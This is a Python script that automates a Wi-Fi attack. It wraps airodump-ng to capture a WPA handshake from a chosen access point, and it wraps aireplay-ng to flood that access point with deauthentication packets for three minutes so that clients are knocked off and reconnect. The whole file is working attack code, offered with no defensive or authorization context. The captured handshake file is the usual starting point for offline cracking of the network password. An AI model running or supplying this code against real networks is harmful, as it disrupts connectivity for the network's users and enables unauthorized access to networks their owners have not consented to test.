import subprocess
import time
import os
import shutil
import threading

def capture_handshake(write_prefix, channel, bssid, interface, stop_event=None, write_dir="."):
    """
    - Capture WPA handshake using airodump-ng.
    - Stops when handshake is detected or stop_event is set.
    - Returns the .cap file path if handshake is found, else None.
    """
    if not shutil.which("airodump-ng"):
        print("[!] airodump-ng not found in PATH")
        return None

    os.makedirs(write_dir, exist_ok=True)
    full_prefix = os.path.join(write_dir, write_prefix)
    cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "-c", str(channel),
        "-w", full_prefix,
        interface
    ]
    print("[*] Starting airodump-ng:", " ".join(cmd))
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    handshake_found = False

    try:
        while True:
            if stop_event and stop_event.is_set():
                print("[-] Stopping handshake capture as deauth attack finished.")
                break
            line = process.stdout.readline()
            if not line:
                if process.poll() is not None:
                    break
                time.sleep(0.1)
                continue
            l = line.lower()
            if "wpa handshake" in l:
                handshake_found = True
                print("[+] Handshake detected.")
                break
    finally:
        try:
            if process.poll() is None:
                process.terminate()
                process.wait(timeout=3)
        except Exception:
            try:
                process.kill()
            except Exception:
                pass

    cap_file = f"{full_prefix}-01.cap"
    if handshake_found and os.path.exists(cap_file):
        print(f"[+] Capture file: {cap_file}")
        return os.path.abspath(cap_file)
    return None

def deauth_attack(bssid, interface, stop_event):
    """
    Launches a deauth attack using aireplay-ng.
    Runs for 3 minutes (180 seconds) then stops and sets stop_event.
    """
    if not shutil.which("aireplay-ng"):
        print("[!] aireplay-ng not found in PATH")
        stop_event.set()
        return

    cmd = [
        "aireplay-ng",
        "--deauth", "0",
        "-a", bssid,
        interface
    ]
    print("[*] Starting aireplay-ng:", " ".join(cmd))
    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        start = time.time()
        while True:
            if time.time() - start > 180:  # 3 minutes
                print("[*] 3 minutes elapsed, stopping deauth attack.")
                break
            if process.poll() is not None:
                break
            time.sleep(1)
    finally:
        try:
            if process.poll() is None:
                process.terminate()
                process.wait(timeout=3)
        except Exception:
            try:
                process.kill()
            except Exception:
                pass
        stop_event.set()
        print("[*] Aireplay-ng stopped.")